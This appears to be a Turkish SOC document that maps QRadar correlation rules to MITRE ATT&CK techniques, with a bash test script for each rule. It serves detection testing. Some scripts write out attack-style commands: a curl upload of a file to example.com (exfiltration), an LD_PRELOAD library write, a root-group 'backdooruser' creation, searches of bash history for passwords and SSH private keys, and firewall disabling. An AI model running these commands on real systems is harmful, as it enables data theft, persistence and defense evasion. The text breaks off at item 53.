# QRadar Korelasyon Kuralları MITRE ATT&CK Eşleştirmesi ve Test Scriptleri

## Özet
Bu doküman, QRadar korelasyon kurallarının MITRE ATT&CK framework'üne göre eşleştirmesini ve her kural için test scriptlerini içermektedir.

---

## 1. DT0504 - Encrypt files using openssl
**Test Definition Analizi:**
- Linux sistemlerde komut satırı üzerinden openssl ile dosya şifreleme işlemlerini tespit eder
- `openssl`, `rsautl`, `-encrypt`, `-inkey` parametrelerini arar

**MITRE ATT&CK Eşleştirmesi:**
- **Teknik:** T1486 - Data Encrypted for Impact
- **Taktik:** Impact
- **Alt Teknik:** Ransomware benzeri davranışlar için kullanılabilir

**Test Script:**
```bash
#!/bin/bash
# DT0504 Test Script
echo "[*] Testing DT0504 - Encrypt files using openssl"
echo "test data" > /tmp/test_file.txt
openssl rsautl -encrypt -inkey /path/to/public.key -pubin -in /tmp/test_file.txt -out /tmp/test_file.enc
rm -f /tmp/test_file.txt /tmp/test_file.enc
```

---

## 2. DT0503 - Encrypt files using 7z
**Test Definition Analizi:**
- 7z aracı ile parola korumalı arşivleme/şifreleme işlemlerini tespit eder
- `7z`, `a`, `-p` parametrelerini kontrol eder

**MITRE ATT&CK Eşleştirmesi:**
- **Teknik:** T1486 - Data Encrypted for Impact
- **Taktik:** Impact
- **Alt Teknik:** T1560.001 - Archive Collected Data: Archive via Utility

**Test Script:**
```bash
#!/bin/bash
# DT0503 Test Script
echo "[*] Testing DT0503 - Encrypt files using 7z"
echo "sensitive data" > /tmp/test_data.txt
7z a -p"testpassword" /tmp/test_archive.7z /tmp/test_data.txt
rm -f /tmp/test_data.txt /tmp/test_archive.7z
```

---

## 3. DT0548 - Load Kernel Module via insmod
**Test Definition Analizi:**
- Kernel modülü yükleme işlemlerini tespit eder
- `insmod` komutu ve `.ko` uzantılı dosyaları arar

**MITRE ATT&CK Eşleştirmesi:**
- **Teknik:** T1547.006 - Boot or Logon Autostart Execution: Kernel Modules and Extensions
- **Taktik:** Persistence, Privilege Escalation
- **Alt Teknik:** Rootkit kurulumu için kullanılabilir

**Test Script:**
```bash
#!/bin/bash
# DT0548 Test Script
echo "[*] Testing DT0548 - Load Kernel Module via insmod"
# Güvenli test için mevcut bir modülü listele
lsmod | head -1
# Gerçek test ortamında: insmod /path/to/module.ko
echo "insmod test_module.ko" # Sadece komut simülasyonu
```

---

## 4. DT0547 - Cron - Add script to /var/spool/cron/crontabs/ folder
**Test Definition Analizi:**
- Crontab dizinine doğrudan erişim ve değişiklikleri tespit eder
- `username=$(id`, `-u`, `-n`, `lsof`, `$username` pattern'lerini arar

**MITRE ATT&CK Eşleştirmesi:**
- **Teknik:** T1053.003 - Scheduled Task/Job: Cron
- **Taktik:** Execution, Persistence, Privilege Escalation

**Test Script:**
```bash
#!/bin/bash
# DT0547 Test Script
echo "[*] Testing DT0547 - Cron manipulation"
username=$(id -u -n)
lsof -u $username | grep cron
```

---

## 5. DT0546 - Cron - Add script to cron subfolders
**Test Definition Analizi:**
- Cron alt dizinlerine (`/etc/cron.monthly`, `/etc/cron.hourly`, `/etc/cron.daily`) yazma işlemlerini tespit eder
- Yönlendirme operatörü `>` kullanımını kontrol eder

**MITRE ATT&CK Eşleştirmesi:**
- **Teknik:** T1053.003 - Scheduled Task/Job: Cron
- **Taktik:** Execution, Persistence, Privilege Escalation

**Test Script:**
```bash
#!/bin/bash
# DT0546 Test Script
echo "[*] Testing DT0546 - Cron subfolders manipulation"
echo "#!/bin/bash" > /tmp/test_cron_script.sh
echo "echo 'test' > /etc/cron.daily/test_script" # Simülasyon
rm -f /tmp/test_cron_script.sh
```

---

## 6. DT0564 - Linux - Add User to Group
**Test Definition Analizi:**
- Kullanıcının gruba eklenme event'lerini tespit eder
- Event kategorisi: `Authentication.Group Member Added`

**MITRE ATT&CK Eşleştirmesi:**
- **Teknik:** T1098 - Account Manipulation
- **Taktik:** Persistence
- **Alt Teknik:** T1098.004 - SSH Authorized Keys (dolaylı)

**Test Script:**
```bash
#!/bin/bash
# DT0564 Test Script
echo "[*] Testing DT0564 - Add user to group"
# QRadar event oluşturmak için gerçek komut gerekir
# usermod -a -G testgroup testuser
echo "usermod komutu simülasyonu"
```

---

## 7. DT0530 - Create a New User in Linux with UID and GID - T1136
**Test Definition Analizi:**
- Root yetkili kullanıcı oluşturma işlemlerini tespit eder
- `useradd` komutu ile `-g 0`, `-M`, `-d /root`, `-s /bin/bash` parametrelerini kontrol eder

**MITRE ATT&CK Eşleştirmesi:**
- **Teknik:** T1136.001 - Create Account: Local Account
- **Taktik:** Persistence
- **Not:** UID/GID 0 kullanımı privilege escalation göstergesi

**Test Script:**
```bash
#!/bin/bash
# DT0530 Test Script
echo "[*] Testing DT0530 - Create privileged user"
# Tehlikeli komut - sadece simülasyon
echo "useradd -g 0 -M -d /root -s /bin/bash backdooruser"
```

---

## 8. DT0531 - Enumerate All Accounts (Local) - T1087
**Test Definition Analizi:**
- `/etc/passwd` dosyasının okunması ve yönlendirilmesini tespit eder
- `cat`, `/etc/passwd`, `>` kombinasyonunu arar

**MITRE ATT&CK Eşleştirmesi:**
- **Teknik:** T1087.001 - Account Discovery: Local Account
- **Taktik:** Discovery

**Test Script:**
```bash
#!/bin/bash
# DT0531 Test Script
echo "[*] Testing DT0531 - Enumerate local accounts"
cat /etc/passwd > /tmp/accounts_list.txt
rm -f /tmp/accounts_list.txt
```

---

## 9. DT0532 - View Sudoers Access - T1087
**Test Definition Analizi:**
- Sudoers dosyasının okunmasını tespit eder
- `cat` komutu ile `/usr/local/etc/sudoers` ve yönlendirme `>` kullanımını kontrol eder

**MITRE ATT&CK Eşleştirmesi:**
- **Teknik:** T1087 - Account Discovery
- **Teknik:** T1069.001 - Permission Groups Discovery: Local Groups
- **Taktik:** Discovery

**Test Script:**
```bash
#!/bin/bash
# DT0532 Test Script
echo "[*] Testing DT0532 - View sudoers access"
cat /etc/sudoers > /tmp/sudoers_backup.txt 2>/dev/null || echo "Permission denied"
rm -f /tmp/sudoers_backup.txt
```

---

## 10. DT0501 - psexec.py (Impacket)
**Test Definition Analizi:**
- Impacket toolkit'inden psexec.py kullanımını tespit eder
- Sadece `psexec.py` komutunu kontrol eder

**MITRE ATT&CK Eşleştirmesi:**
- **Teknik:** T1569.002 - System Services: Service Execution
- **Teknik:** T1021.002 - Remote Services: SMB/Windows Admin Shares
- **Taktik:** Execution, Lateral Movement

**Test Script:**
```bash
#!/bin/bash
# DT0501 Test Script
echo "[*] Testing DT0501 - psexec.py usage"
# Simülasyon
echo "psexec.py domain/user:password@target"
```

---

## 11. DT0560 - Exfiltrate Data via HTTPS Using curl Linux
**Test Definition Analizi:**
- curl ile veri sızdırma işlemlerini tespit eder
- `curl` komutu ile `maxDownloads=1` veya `autoDelete=true` parametrelerini arar

**MITRE ATT&CK Eşleştirmesi:**
- **Teknik:** T1048.003 - Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol
- **Teknik:** T1567.002 - Exfiltration Over Web Service: Exfiltration to Cloud Storage
- **Taktik:** Exfiltration

**Test Script:**
```bash
#!/bin/bash
# DT0560 Test Script
echo "[*] Testing DT0560 - Data exfiltration via curl"
echo "test data" > /tmp/exfil_test.txt
curl -X POST "https://example.com/upload?maxDownloads=1&autoDelete=true" -F "file=@/tmp/exfil_test.txt"
rm -f /tmp/exfil_test.txt
```

---

## 12. DT0559 - Full path of the library to add to ld.so.preload
**Test Definition Analizi:**
- LD_PRELOAD hijacking için `/etc/ld.so.preload` dosyasına yazma işlemlerini tespit eder
- `tee -a /etc/ld.so.preload` kullanımını kontrol eder

**MITRE ATT&CK Eşleştirmesi:**
- **Teknik:** T1574.006 - Hijack Execution Flow: Dynamic Linker Hijacking
- **Taktik:** Persistence, Privilege Escalation, Defense Evasion

**Test Script:**
```bash
#!/bin/bash
# DT0559 Test Script
echo "[*] Testing DT0559 - LD_PRELOAD manipulation"
echo "/tmp/malicious.so" | sudo tee -a /etc/ld.so.preload.test
rm -f /etc/ld.so.preload.test
```

---

## 13. DT0543 - Decode base64 Data into Script
**Test Definition Analizi:**
- Base64 encoded veriyi decode edip script dosyasına yazma işlemlerini tespit eder
- `base64 -d` ve `.sh` uzantısını kontrol eder

**MITRE ATT&CK Eşleştirmesi:**
- **Teknik:** T1140 - Deobfuscate/Decode Files or Information
- **Teknik:** T1027 - Obfuscated Files or Information
- **Taktik:** Defense Evasion

**Test Script:**
```bash
#!/bin/bash
# DT0543 Test Script
echo "[*] Testing DT0543 - Base64 decode to script"
echo "IyEvYmluL2Jhc2gKZWNobyAidGVzdCI=" | base64 -d > /tmp/decoded_script.sh
rm -f /tmp/decoded_script.sh
```

---

## 14. DT0525 - Examine Password Complexity Policy - CentOS/RHEL - T1201
**Test Definition Analizi:**
- Parola politikası dosyasının okunmasını tespit eder
- `cat` veya `vi` ile `/etc/security/pwquality.conf` erişimini kontrol eder

**MITRE ATT&CK Eşleştirmesi:**
- **Teknik:** T1201 - Password Policy Discovery
- **Taktik:** Discovery

**Test Script:**
```bash
#!/bin/bash
# DT0525 Test Script
echo "[*] Testing DT0525 - Password policy discovery"
cat /etc/security/pwquality.conf 2>/dev/null || echo "File not found"
```

---

## 15. DT0562 - Discover System Language by locale File
**Test Definition Analizi:**
- Sistem dil ayarlarının keşfini tespit eder
- `/etc/locale.conf` veya `/etc/default/locale` dosyalarına erişimi kontrol eder

**MITRE ATT&CK Eşleştirmesi:**
- **Teknik:** T1082 - System Information Discovery
- **Taktik:** Discovery

**Test Script:**
```bash
#!/bin/bash
# DT0562 Test Script
echo "[*] Testing DT0562 - System language discovery"
cat /etc/locale.conf 2>/dev/null || cat /etc/default/locale 2>/dev/null
```

---

## 16. DT0561 - Pad Binary to Change Hash - dd
**Test Definition Analizi:**
- Binary dosyaların hash değerini değiştirmek için padding ekleme işlemlerini tespit eder
- `dd if=/dev/zero` veya `/dev/random` veya `/dev/urandom` kullanımını kontrol eder

**MITRE ATT&CK Eşleştirmesi:**
- **Teknik:** T1027.005 - Obfuscated Files or Information: Indicator Removal from Tools
- **Teknik:** T1036.005 - Masquerading: Match Legitimate Name or Location
- **Taktik:** Defense Evasion

**Test Script:**
```bash
#!/bin/bash
# DT0561 Test Script
echo "[*] Testing DT0561 - Binary padding for hash change"
cp /bin/ls /tmp/test_binary
dd if=/dev/zero bs=1 count=100 >> /tmp/test_binary
rm -f /tmp/test_binary
```

---

## 17. DT0502 - Encrypt files using gpg
**Test Definition Analizi:**
- GPG ile otomatik şifreleme işlemlerini tespit eder
- `gpg --passphrase-fd 0 --batch --yes` parametrelerini kontrol eder

**MITRE ATT&CK Eşleştirmesi:**
- **Teknik:** T1486 - Data Encrypted for Impact
- **Teknik:** T1560.001 - Archive Collected Data: Archive via Utility
- **Taktik:** Impact, Collection

**Test Script:**
```bash
#!/bin/bash
# DT0502 Test Script
echo "[*] Testing DT0502 - Encrypt files using gpg"
echo "test data" > /tmp/test_gpg.txt
echo "password123" | gpg --passphrase-fd 0 --batch --yes -c /tmp/test_gpg.txt
rm -f /tmp/test_gpg.txt /tmp/test_gpg.txt.gpg
```

---

## 18. DT0527 - Examine Password Expiration Policy - All Linux - T1201
**Test Definition Analizi:**
- Parola süre politikasının keşfini tespit eder
- `cat` veya `vi` ile `/etc/login.defs` erişimini kontrol eder

**MITRE ATT&CK Eşleştirmesi:**
- **Teknik:** T1201 - Password Policy Discovery
- **Taktik:** Discovery

**Test Script:**
```bash
#!/bin/bash
# DT0527 Test Script
echo "[*] Testing DT0527 - Password expiration policy discovery"
cat /etc/login.defs | grep -E "PASS_MAX_DAYS|PASS_MIN_DAYS|PASS_WARN_AGE"
```

---

## 19. DT0545 - Show if a User Account has Ever Logged in Remotely
**Test Definition Analizi:**
- Kullanıcıların uzaktan giriş geçmişini sorgulamayı tespit eder
- `lastlog` komutunu kontrol eder

**MITRE ATT&CK Eşleştirmesi:**
- **Teknik:** T1087.001 - Account Discovery: Local Account
- **Teknik:** T1049 - System Network Connections Discovery
- **Taktik:** Discovery

**Test Script:**
```bash
#!/bin/bash
# DT0545 Test Script
echo "[*] Testing DT0545 - Remote login history"
lastlog
```

---

## 20. DT0526 - Examine Password Complexity Policy - CentOS/RHEL 2 - T1201
**Test Definition Analizi:**
- PAM ve pwquality yapılandırmalarının keşfini tespit eder
- `/etc/pam.d/system-auth` veya `/etc/security/pwquality.conf` erişimini kontrol eder

**MITRE ATT&CK Eşleştirmesi:**
- **Teknik:** T1201 - Password Policy Discovery
- **Taktik:** Discovery

**Test Script:**
```bash
#!/bin/bash
# DT0526 Test Script
echo "[*] Testing DT0526 - PAM password policy discovery"
cat /etc/pam.d/system-auth 2>/dev/null | grep -i password
```

---

## 21. DT0544 - List opened files by user
**Test Definition Analizi:**
- Belirli bir kullanıcının açık dosyalarını listelemeyi tespit eder
- `username=$(id -u -n) && lsof -u $username` pattern'ini kontrol eder

**MITRE ATT&CK Eşleştirmesi:**
- **Teknik:** T1057 - Process Discovery
- **Teknik:** T1083 - File and Directory Discovery
- **Taktik:** Discovery

**Test Script:**
```bash
#!/bin/bash
# DT0544 Test Script
echo "[*] Testing DT0544 - List user's open files"
username=$(id -u -n) && lsof -u $username | head -10
```

---

## 22. DT0563 - Discover System Language with localectl
**Test Definition Analizi:**
- Sistem dil ayarlarını localectl ile sorgulamayı tespit eder
- `localectl status` komutunu kontrol eder

**MITRE ATT&CK Eşleştirmesi:**
- **Teknik:** T1082 - System Information Discovery
- **Taktik:** Discovery

**Test Script:**
```bash
#!/bin/bash
# DT0563 Test Script
echo "[*] Testing DT0563 - System language discovery with localectl"
localectl status
```

---

## 23. DT0529 - Create a User Account on a Linux System - T1136
**Test Definition Analizi:**
- Kullanıcı hesabı oluşturma event'lerini tespit eder
- Event kategorisi: `Authentication.User Account Added`

**MITRE ATT&CK Eşleştirmesi:**
- **Teknik:** T1136.001 - Create Account: Local Account
- **Taktik:** Persistence

**Test Script:**
```bash
#!/bin/bash
# DT0529 Test Script
echo "[*] Testing DT0529 - User account creation"
# Event tabanlı kural - gerçek useradd komutu gerekir
echo "useradd testuser simülasyonu"
```

---

## 24. DT0528 - Network Share Discovery - Linux - T1135
**Test Definition Analizi:**
- SMB paylaşımlarını keşfetmeyi tespit eder
- `smbstatus --shares` komutunu kontrol eder

**MITRE ATT&CK Eşleştirmesi:**
- **Teknik:** T1135 - Network Share Discovery
- **Taktik:** Discovery

**Test Script:**
```bash
#!/bin/bash
# DT0528 Test Script
echo "[*] Testing DT0528 - Network share discovery"
smbstatus --shares 2>/dev/null || echo "smbstatus not available"
```

---

## 25. DT0508 - System Service Discovery - systemctl
**Test Definition Analizi:**
- Sistemdeki servisleri listelemeyi tespit eder
- `systemctl --type=service` komutunu kontrol eder

**MITRE ATT&CK Eşleştirmesi:**
- **Teknik:** T1007 - System Service Discovery
- **Taktik:** Discovery

**Test Script:**
```bash
#!/bin/bash
# DT0508 Test Script
echo "[*] Testing DT0508 - System service discovery"
systemctl --type=service --state=running | head -10
```

---

## 26. DT0507 - Search Through Bash History
**Test Definition Analizi:**
- Bash geçmişinde arama yapmayı tespit eder
- `cat` ve `grep` ile `.bash_history` dosyasına erişimi kontrol eder

**MITRE ATT&CK Eşleştirmesi:**
- **Teknik:** T1552.003 - Unsecured Credentials: Bash History
- **Taktik:** Credential Access

**Test Script:**
```bash
#!/bin/bash
# DT0507 Test Script
echo "[*] Testing DT0507 - Search bash history"
cat ~/.bash_history | grep -i password
```

---

## 27. DT0557 - List OS Information
**Test Definition Analizi:**
- İşletim sistemi bilgilerini toplamayı tespit eder
- `uname -a`, `uptime`, `/etc/os-release` vb. komutları kontrol eder

**MITRE ATT&CK Eşleştirmesi:**
- **Teknik:** T1082 - System Information Discovery
- **Taktik:** Discovery

**Test Script:**
```bash
#!/bin/bash
# DT0557 Test Script
echo "[*] Testing DT0557 - OS information gathering"
uname -a
cat /etc/os-release
```

---

## 28. DT0511 - Disable History Collection
**Test Definition Analizi:**
- Bash history devre dışı bırakma girişimlerini tespit eder
- `HISTCONTROL=ignoreboth` ayarını kontrol eder

**MITRE ATT&CK Eşleştirmesi:**
- **Teknik:** T1562.003 - Impair Defenses: HISTCONTROL
- **Taktik:** Defense Evasion

**Test Script:**
```bash
#!/bin/bash
# DT0511 Test Script
echo "[*] Testing DT0511 - Disable history collection"
export HISTCONTROL=ignoreboth
echo "This command won't be saved to history"
```

---

## 29. DT0510 - Overwrite file with DD
**Test Definition Analizi:**
- DD ile log dosyalarının üzerine yazma işlemlerini tespit eder
- `dd` komutu ile `/dev/zero` ve `/var/log` kullanımını kontrol eder

**MITRE ATT&CK Eşleştirmesi:**
- **Teknik:** T1070.003 - Indicator Removal: Clear Command History
- **Teknik:** T1070.002 - Indicator Removal: Clear Linux or Mac System Logs
- **Taktik:** Defense Evasion

**Test Script:**
```bash
#!/bin/bash
# DT0510 Test Script
echo "[*] Testing DT0510 - Overwrite files with dd"
touch /tmp/test_log.log
dd if=/dev/zero of=/tmp/test_log.log bs=1024 count=1
rm -f /tmp/test_log.log
```

---

## 30. DT0512 - Browser Bookmark Discovery
**Test Definition Analizi:**
- Firefox bookmark veritabanını aramayı tespit eder
- `find` komutu ile `places.sqlite` aramasını kontrol eder

**MITRE ATT&CK Eşleştirmesi:**
- **Teknik:** T1217 - Browser Information Discovery
- **Taktik:** Discovery

**Test Script:**
```bash
#!/bin/bash
# DT0512 Test Script
echo "[*] Testing DT0512 - Browser bookmark discovery"
find ~/.mozilla -name "places.sqlite" 2>/dev/null
```

---

## 31. DT0509 - Permission Groups Discovery (Local)
**Test Definition Analizi:**
- Sistem grup bilgilerini keşfetmeyi tespit eder
- `cat /etc/group` komutunu kontrol eder

**MITRE ATT&CK Eşleştirmesi:**
- **Teknik:** T1069.001 - Permission Groups Discovery: Local Groups
- **Taktik:** Discovery

**Test Script:**
```bash
#!/bin/bash
# DT0509 Test Script
echo "[*] Testing DT0509 - Permission groups discovery"
cat /etc/group | grep -E "sudo|admin|wheel"
```

---

## 32. DT0558 - Linux VM Check via Hardware
**Test Definition Analizi:**
- Sanal makine tespiti için donanım bilgilerini sorgulamayı tespit eder
- DMI bilgileri, SCSI/IDE cihazları kontrol eder

**MITRE ATT&CK Eşleştirmesi:**
- **Teknik:** T1497.001 - Virtualization/Sandbox Evasion: System Checks
- **Taktik:** Defense Evasion, Discovery

**Test Script:**
```bash
#!/bin/bash
# DT0558 Test Script
echo "[*] Testing DT0558 - VM detection via hardware"
cat /sys/class/dmi/id/product_name 2>/dev/null
dmidecode -s system-manufacturer 2>/dev/null
```

---

## 33. DT0540 - Edit UFW Firewall ufw.conf File - T1562
**Test Definition Analizi:**
- UFW firewall yapılandırma dosyasına yazma işlemlerini tespit eder
- `>> /etc/ufw/ufw.conf` kullanımını kontrol eder

**MITRE ATT&CK Eşleştirmesi:**
- **Teknik:** T1562.004 - Impair Defenses: Disable or Modify System Firewall
- **Taktik:** Defense Evasion

**Test Script:**
```bash
#!/bin/bash
# DT0540 Test Script
echo "[*] Testing DT0540 - UFW config manipulation"
echo "# Test comment" >> /tmp/ufw.conf.test
rm -f /tmp/ufw.conf.test
```

---

## 34. DT0539 - UFW Firewall user.rules File - T1562
**Test Definition Analizi:**
- UFW kullanıcı kuralları dosyasına yazma işlemlerini tespit eder
- `>> /etc/ufw/user.rules` kullanımını kontrol eder

**MITRE ATT&CK Eşleştirmesi:**
- **Teknik:** T1562.004 - Impair Defenses: Disable or Modify System Firewall
- **Taktik:** Defense Evasion

**Test Script:**
```bash
#!/bin/bash
# DT0539 Test Script
echo "[*] Testing DT0539 - UFW user rules manipulation"
echo "# Test rule" >> /tmp/user.rules.test
rm -f /tmp/user.rules.test
```

---

## 35. DT0542 - Edit UFW Firewall Main Configuration File - T1562
**Test Definition Analizi:**
- UFW ana yapılandırma dosyasına yazma işlemlerini tespit eder
- `>> /etc/default/ufw` kullanımını kontrol eder

**MITRE ATT&CK Eşleştirmesi:**
- **Teknik:** T1562.004 - Impair Defenses: Disable or Modify System Firewall
- **Taktik:** Defense Evasion

**Test Script:**
```bash
#!/bin/bash
# DT0542 Test Script
echo "[*] Testing DT0542 - UFW default config manipulation"
echo "# Test configuration" >> /tmp/ufw.default.test
rm -f /tmp/ufw.default.test
```

---

## 36. DT0541 - Edit UFW Firewall sysctl.conf File - T1562
**Test Definition Analizi:**
- UFW sysctl yapılandırma dosyasına yazma işlemlerini tespit eder
- `>> /etc/ufw/sysctl.conf` kullanımını kontrol eder

**MITRE ATT&CK Eşleştirmesi:**
- **Teknik:** T1562.004 - Impair Defenses: Disable or Modify System Firewall
- **Taktik:** Defense Evasion

**Test Script:**
```bash
#!/bin/bash
# DT0541 Test Script
echo "[*] Testing DT0541 - UFW sysctl manipulation"
echo "# Test sysctl setting" >> /tmp/sysctl.conf.test
rm -f /tmp/sysctl.conf.test
```

---

## 37. DT0565 - Linux - Remove User From Group
**Test Definition Analizi:**
- Kullanıcının gruptan çıkarılma event'lerini tespit eder
- Event kategorisi: `Authentication.Group Member Removed`

**MITRE ATT&CK Eşleştirmesi:**
- **Teknik:** T1098 - Account Manipulation
- **Taktik:** Persistence, Defense Evasion

**Test Script:**
```bash
#!/bin/bash
# DT0565 Test Script
echo "[*] Testing DT0565 - Remove user from group"
# Event tabanlı kural
echo "gpasswd -d user group simülasyonu"
```

---

## 38. DT0550 - Python http.server module usage detected
**Test Definition Analizi:**
- Python HTTP server modülü kullanımını tespit eder
- `python3 -m http.server` komutunu kontrol eder

**MITRE ATT&CK Eşleştirmesi:**
- **Teknik:** T1071.001 - Application Layer Protocol: Web Protocols
- **Teknik:** T1105 - Ingress Tool Transfer
- **Taktik:** Command and Control

**Test Script:**
```bash
#!/bin/bash
# DT0550 Test Script
echo "[*] Testing DT0550 - Python HTTP server"
timeout 2 python3 -m http.server 8888 &
sleep 1
pkill -f "python3 -m http.server"
```

---

## 39. DT0505 - Encrypt files using ccrypt
**Test Definition Analizi:**
- Ccrypt aracı ile şifreleme işlemlerini tespit eder
- `ccencrypt` veya `ccrypt` komutlarını kontrol eder

**MITRE ATT&CK Eşleştirmesi:**
- **Teknik:** T1486 - Data Encrypted for Impact
- **Taktik:** Impact

**Test Script:**
```bash
#!/bin/bash
# DT0505 Test Script
echo "[*] Testing DT0505 - Encrypt files using ccrypt"
echo "test data" > /tmp/test_ccrypt.txt
# ccencrypt /tmp/test_ccrypt.txt # Gerçek komut
echo "ccencrypt simülasyonu"
rm -f /tmp/test_ccrypt.txt
```

---

## 40. DT0549 - Linux List Kernel Modules (AKTİF KURAL)
**Test Definition Analizi:**
- Kernel modüllerini listeleme işlemlerini tespit eder
- `lsmod`, `kmod list`, `grep vmw /proc/modules` komutlarını kontrol eder

**MITRE ATT&CK Eşleştirmesi:**
- **Teknik:** T1082 - System Information Discovery
- **Teknik:** T1014 - Rootkit
- **Taktik:** Discovery, Defense Evasion

**Test Script:**
```bash
#!/bin/bash
# DT0549 Test Script - AKTİF KURAL
echo "[*] Testing DT0549 - List kernel modules"
lsmod | head -5
grep vmw /proc/modules 2>/dev/null || echo "No VMware modules"
```

---

## 41. DT0567 - Linux - Delete User Account
**Test Definition Analizi:**
- Kullanıcı hesabı silme event'lerini tespit eder
- Event kategorisi: `Authentication.User Account Removed`

**MITRE ATT&CK Eşleştirmesi:**
- **Teknik:** T1531 - Account Access Removal
- **Taktik:** Impact

**Test Script:**
```bash
#!/bin/bash
# DT0567 Test Script
echo "[*] Testing DT0567 - Delete user account"
# Event tabanlı kural
echo "userdel testuser simülasyonu"
```

---

## 42. DT0534 - disable/enable UFW Firewall - T1562
**Test Definition Analizi:**
- UFW firewall'ın devre dışı bırakılması veya etkinleştirilmesini tespit eder
- `ufw disable` veya `ufw enable` komutlarını kontrol eder

**MITRE ATT&CK Eşleştirmesi:**
- **Teknik:** T1562.004 - Impair Defenses: Disable or Modify System Firewall
- **Taktik:** Defense Evasion

**Test Script:**
```bash
#!/bin/bash
# DT0534 Test Script
echo "[*] Testing DT0534 - UFW disable/enable"
# Tehlikeli komut - sadece simülasyon
echo "ufw disable simülasyonu"
```

---

## 43. DT0552 - Remote System Discovery - ip neighbour
**Test Definition Analizi:**
- ARP tablosu üzerinden ağdaki sistemleri keşfetmeyi tespit eder
- `ip neighbour show` komutunu kontrol eder

**MITRE ATT&CK Eşleştirmesi:**
- **Teknik:** T1018 - Remote System Discovery
- **Taktik:** Discovery

**Test Script:**
```bash
#!/bin/bash
# DT0552 Test Script
echo "[*] Testing DT0552 - Remote system discovery via ip neighbour"
ip neighbour show
```

---

## 44. DT0566 - Linux User Privilege Escalation
**Test Definition Analizi:**
- Kullanıcının sudo grubuna eklenmesini tespit eder
- Group Name: `sudo` olan group member added event'lerini kontrol eder

**MITRE ATT&CK Eşleştirmesi:**
- **Teknik:** T1078.003 - Valid Accounts: Local Accounts
- **Teknik:** T1548.003 - Abuse Elevation Control Mechanism: Sudo and Sudo Caching
- **Taktik:** Privilege Escalation, Persistence

**Test Script:**
```bash
#!/bin/bash
# DT0566 Test Script
echo "[*] Testing DT0566 - User privilege escalation"
# Event tabanlı kural
echo "usermod -aG sudo testuser simülasyonu"
```

---

## 45. DT0533 - View Accounts with UID 0 - T1087
**Test Definition Analizi:**
- UID 0 (root) olan hesapları aramayı tespit eder
- `grep 'x:0:' /etc/passwd` pattern'ini kontrol eder

**MITRE ATT&CK Eşleştirmesi:**
- **Teknik:** T1087.001 - Account Discovery: Local Account
- **Taktik:** Discovery
- **Not:** Privilege escalation kontrolü için kritik

**Test Script:**
```bash
#!/bin/bash
# DT0533 Test Script
echo "[*] Testing DT0533 - View accounts with UID 0"
grep 'x:0:' /etc/passwd > /tmp/root_accounts.txt
cat /tmp/root_accounts.txt
rm -f /tmp/root_accounts.txt
```

---

## 46. DT0551 - Remote System Discovery - arp nix
**Test Definition Analizi:**
- ARP komutu ile ağdaki sistemleri keşfetmeyi tespit eder
- `arp -a` komutunu kontrol eder

**MITRE ATT&CK Eşleştirmesi:**
- **Teknik:** T1018 - Remote System Discovery
- **Taktik:** Discovery

**Test Script:**
```bash
#!/bin/bash
# DT0551 Test Script
echo "[*] Testing DT0551 - Remote system discovery via arp"
arp -a
```

---

## 47. DT0536 - Turn off UFW Logging - T1562
**Test Definition Analizi:**
- UFW log kaydını kapatma girişimlerini tespit eder
- `ufw logging off` komutunu kontrol eder

**MITRE ATT&CK Eşleştirmesi:**
- **Teknik:** T1562.003 - Impair Defenses: Impair Command History Logging
- **Teknik:** T1070.002 - Indicator Removal: Clear Linux or Mac System Logs
- **Taktik:** Defense Evasion

**Test Script:**
```bash
#!/bin/bash
# DT0536 Test Script
echo "[*] Testing DT0536 - Turn off UFW logging"
# Tehlikeli komut - sadece simülasyon
echo "ufw logging off simülasyonu"
```

---

## 48. DT0554 - Remote System Discovery - ip tcp_metrics
**Test Definition Analizi:**
- TCP metrics üzerinden ağ keşfi yapmayı tespit eder
- `ip tcp_metrics show` komutunu kontrol eder

**MITRE ATT&CK Eşleştirmesi:**
- **Teknik:** T1018 - Remote System Discovery
- **Taktik:** Discovery

**Test Script:**
```bash
#!/bin/bash
# DT0554 Test Script
echo "[*] Testing DT0554 - Remote system discovery via tcp_metrics"
ip tcp_metrics show 2>/dev/null || echo "No TCP metrics available"
```

---

## 49. DT0535 - Stop/Start UFW Firewall Systemctl - T1562
**Test Definition Analizi:**
- Systemctl ile UFW servisini durdurmayı/başlatmayı tespit eder
- `systemctl start/stop ufw` komutlarını kontrol eder

**MITRE ATT&CK Eşleştirmesi:**
- **Teknik:** T1562.004 - Impair Defenses: Disable or Modify System Firewall
- **Taktik:** Defense Evasion

**Test Script:**
```bash
#!/bin/bash
# DT0535 Test Script
echo "[*] Testing DT0535 - UFW service manipulation"
# Tehlikeli komut - sadece simülasyon
echo "systemctl stop ufw simülasyonu"
```

---

## 50. DT0553 - Remote System Discovery - ip route
**Test Definition Analizi:**
- Routing tablosu üzerinden ağ keşfi yapmayı tespit eder
- `ip route show` komutunu kontrol eder

**MITRE ATT&CK Eşleştirmesi:**
- **Teknik:** T1016 - System Network Configuration Discovery
- **Teknik:** T1018 - Remote System Discovery
- **Taktik:** Discovery

**Test Script:**
```bash
#!/bin/bash
# DT0553 Test Script
echo "[*] Testing DT0553 - Network discovery via routing table"
ip route show
```

---

## 51. DT0506 - Discover Private SSH Keys
**Test Definition Analizi:**
- SSH private key dosyalarını aramayı tespit eder
- `find -name id_rsa` komutunu kontrol eder

**MITRE ATT&CK Eşleştirmesi:**
- **Teknik:** T1552.004 - Unsecured Credentials: Private Keys
- **Taktik:** Credential Access

**Test Script:**
```bash
#!/bin/bash
# DT0506 Test Script
echo "[*] Testing DT0506 - SSH private key discovery"
find ~ -name "id_rsa" -o -name "id_dsa" -o -name "id_ecdsa" 2>/dev/null | head -5
```

---

## 52. DT0556 - Add or copy content to clipboard with xClip
**Test Definition Analizi:**
- xclip ile clipboard'a veri kopyalamayı tespit eder
- `xclip -sel clip` komutunu kontrol eder

**MITRE ATT&CK Eşleştirmesi:**
- **Teknik:** T1115 - Clipboard Data
- **Taktik:** Collection

**Test Script:**
```bash
#!/bin/bash
# DT0556 Test Script
echo "[*] Testing DT0556 - Clipboard manipulation with xclip"
echo "test data" | xclip -sel clip 2>/dev/null || echo "xclip not available"
```

---

## 53. DT0538 - Modify SSH Authorized Keys - T1098
**Test Definition Analizi:**
- SSH authorized_keys dosyasına yazma işlemlerini tespit eder
- `> ~/.ssh/authorized_keys` kullanımını kontrol eder

**MITRE ATT&CK Eşleştirmesi:**
- **Teknik:** T1098.004 - Account Manipulation: SSH Authorized Keys
- **Taktik:** Persistence

**Test Script:**
```bash
#!/bin/bash
# DT0538 Test Script
